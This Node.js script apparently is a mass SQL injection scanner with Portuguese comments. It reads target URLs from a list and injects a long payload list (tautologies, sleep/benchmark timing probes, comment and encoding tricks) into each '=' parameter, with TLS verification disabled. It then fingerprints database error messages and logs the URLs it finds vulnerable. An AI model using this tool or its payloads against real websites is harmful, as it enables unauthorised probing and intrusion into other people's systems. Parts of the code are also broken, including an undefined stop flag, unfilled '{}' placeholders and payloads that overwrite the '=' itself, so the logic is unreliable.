const readline = require('readline');
const axios = require('axios');
const fs = require('fs');
const color = require('colors');
const { URL } = require('url');
const EventEmitter = require('events');
const emitter = new EventEmitter();
emitter.setMaxListeners(0);
const https = require('https');

const agent = new https.Agent({  
  rejectUnauthorized: false, // Ignora erros de certificado SSL
  secureProtocol: 'TLS_method' // Define o protocolo TLS
});

function isValidUrl(url) {
    try {
        new URL(url);
        return url.indexOf("=") !== -1 ? true : false;
    } catch (error) {
        return false;
    }
}

function getHostname(urlString) {
    try {
        const parsedUrl = new URL(urlString);
        return parsedUrl.hostname;
    } catch (error) {
        console.error('URL inválida:', error.message);
        return null;
    }
}

function isInteger(value) {
    const number = parseInt(value, 10);
    return !isNaN(number) && Number.isInteger(number);
}



const payloads = [
    "'{}",
    "{}'",
    "{}#",
    "{}/*",
    "{}%00",
    "{}%23",
    "'%20or%20'1'%3D'1",
    "'%20or%20'1'%3D1%23",
    "'%20or%201%3D1",
    "'%20or%201%3D1%23",
    "'%20or%20''='",
    "'%20or%20''='%23",
    "')%20or%20('x'='x",
    "') or ('x'='x",
    "') or '1'='1",
    '") or ("x"="x',
    '") or "x"="x',
    '") or "1"="1',
    "\" or \"x\"=\"x",
    "\" or \"1\"=\"1",
    "' or sleep(5) = '",
    "' or sleep(10) = '",
    "' or benchmark(10000000,md5(1))#",
    "' and 1=(select count(*) from tablename); --",
    "' and 1=(select count(*) from tablename where columnname LIKE 'A%'); --",
    "'{}",
    "{}'",
    '{}',
    '{} ',
    '{}%00',
    '"{}"',
    "{}#",
    "{}--",
    "{}/**/",
    "{}/*!",
    "/**/{}",
    "{}/*",
    "{};--",
    "{};#",
    "{}%20",
    "{}%25",
    "{}%0A",
    "{}%0D",
    "{}%09",
    '{}-- -',
    '{}#',
    '{}/*',
    '{}%0d%0a',
    '{}%23',
    '{}%26',
    '{}%3b',
    '{}%7c',
    '{}\\',
    '{}|',
    '{}$',
    '{}%0a',
    '{}%09%0a',
    '{}%0A%09',
    '{}%09%23',
    '{}%20%23',
    '{}%0D%0A%20',
    '{}%0D%0A%09',
    '{}%0D%0A%0D%0A',
    '{}%23%0D%0A',
    '{}%23%0D%0A%09',
    '{}%23%0D%0A%20',
    '{}%23%0A',
    '{}%23%20',
    '{}%23%09',
    '{}%20%3B',
    '{}%09%3B',
    '{}%20--%20',
    '{}%0d%0a%23%20',
    '{}%0d%0a%20%23',
    '{}%20%23%0d%0a',
    '{}%20%0d%0a%23',
    '{}%20%23%20',
    '{}%0d%0a%09%23%20',
    '{}%0d%0a%20%09%23',
    '{}%20%09%0d%0a%23',
    '{}%20%09%23%0d%0a',
    '{}%23%20%0d%0a',
    '{}%23%0d%0a%20%09',
    '{}%20and%20{}={}',
    '{}%20and%20{}>{}/',
    '{}%20and%20{}>{}',
];

const  erros = {
                  "MySQL": {
                    "Syntax Error": "You have an error in your SQL syntax;"
                  },
                  "PostgreSQL": {
                    "Syntax Error": "syntax error at or"
                  },
                  "Microsoft SQL Server (MSSQL)": {
                    "Syntax Error": "Incorrect syntax near"
                  },
                  "Oracle": {
                    "Syntax Error": "missing keyword",
                    "ORA-00936": "missing expression",
                    "ORA-00933": "SQL command not properly ended"
                  },
                  "SQLite": {
                    "Syntax Error": "SQL error or missing database:"
                  },
                  "IBM Db2": {
                    "Syntax Error": "SQL0206N: Column",
                    "SQL0601N": "The name of a column is missing from the SELECT list."
                  },
                  "MariaDB": {
                    "Syntax Error": "You have an error in your SQL syntax;"
                  },
                  "Sybase": {
                    "Syntax Error": "Incorrect syntax near..."
                  },
                  "Amazon Aurora": {
                    "Syntax Error": "You have an error in your SQL syntax;"
                  },
                  "Amazon Redshift": {
                    "Syntax Error": "syntax error at or"
                  },
                  "Cassandra": {
                    "Syntax Error": "SyntaxException: unexpected token"
                  },
                  "HBase": {
                    "Syntax Error": "Syntax error: unexpected token"
                  },
                  "Apache Derby": {
                    "Syntax Error": "Syntax error or access rule violation."
                  },
                  "Firebird": {
                    "Syntax Error": "Statement failed, SQLCODE"
                  },
                  "SQLite": {
                    "Syntax Error": "SQL error or missing database:"
                  }
                }

// Cria uma interface para entrada e saída
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

// Função para perguntar ao usuário
function askQuestion(question) {
    return new Promise((resolve) => {
        rl.question(question, (answer) => {
            resolve(answer.trim().toUpperCase());
        });
    });
}

// Função para inserir payloads e URL
async function insertPayloadUrl(url, param, payloads, executeVerification, queue) {
    // Encontre todas as posições dos delimitadores
    let positions = [];
    for (let i = 0; i < url.length; i++) {
        if (url[i] === param) {
            positions.push(i);
        }
    }
    let status = false;
    for (let pos of positions) {
        let countPaylod = 0;
        if (status) break;
        for (const payload of payloads) {
            countPaylod++;
            if (shouldStop) break;
            let newUrl = url.substring(0, pos) + payload + url.substring(pos + 1);      
            const result = await startScan(newUrl, executeVerification, payload);
            if (result === true) {
                status = true;
                break;
            }
            if(countPaylod == 27) break;
        }
    }
    return status;
}



// Função principal para iniciar o processo
async function startScan(url, executeVerification, payload) {
    try {
        const source = await axios.get(url, {
            httpsAgent: agent,
            headers: {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': 'pt-BR,pt;q=0.9'
            }
        });
        const pagina = source.data;
        const result = await await veryfyErrosSqli(url, erros, pagina, executeVerification, payload);
        return result;
    } catch (error) {
        if(error.response){
            const result = await await veryfyErrosSqli(url, erros, error.response.data, executeVerification, payload);
            return result;
        }
        
    }
}
// Função para verificar erros SQL
async function veryfyErrosSqli(url, erros, pagina, executeVerification, payload) {
    let status = false;
    console.log(url)
    for (const banco in erros) {
        if(status) break;
        if (Object.hasOwnProperty.call(erros, banco)) {
            const errosBanco = erros[banco];
            for (const tipoErro in errosBanco) {
                if (Object.hasOwnProperty.call(errosBanco, tipoErro)) {
                    if (pagina.indexOf(errosBanco[tipoErro]) >= 0) {
                        const hostname = getHostname(url);
                        const infos = [{
                            "HostName": hostname,
                            "SGDB": banco,
                            "Payload": payload,
                            "TypeError": errosBanco[tipoErro],
                            "href": url
                        }];
                        console.log(`[success]`.green + `${hostname}` + `[${tipoErro}]`);
                        console.table(infos);
                        fs.appendFileSync(`./output/vuls.txt` , `${url}` + '\n');
                        status = true;
                        break;
                    }
                }

            }
        }
    }
    return status;
}
// Função principal para inicializar o processo
async function init() {
    const { default: PQueue } = await import('p-queue');
    const answer = await askQuestion('Deseja executar a verificação básica? (Y/N): ');
    let executeVerification;
    if (answer === 'Y') {
        executeVerification = true;
        console.log('Iniciando a verificação básica.');
    } else if (answer === 'N') {
        executeVerification = false;
        console.log('Iniciando verificação avançada.');
    } else {
        console.log('Resposta inválida. Por favor, responda com Y ou N.');
        rl.close();
        return;
    }
    const lista = fs.readFileSync('./lista.txt' , { encoding: 'utf-8' }).split('\n');
    const queue = new PQueue({ concurrency: 25 });
    for (const url of lista) {
        queue.add(() => insertPayloadUrl(url, "=", payloads, executeVerification));
    }

    rl.close();
}

// Executa a função principal
init();
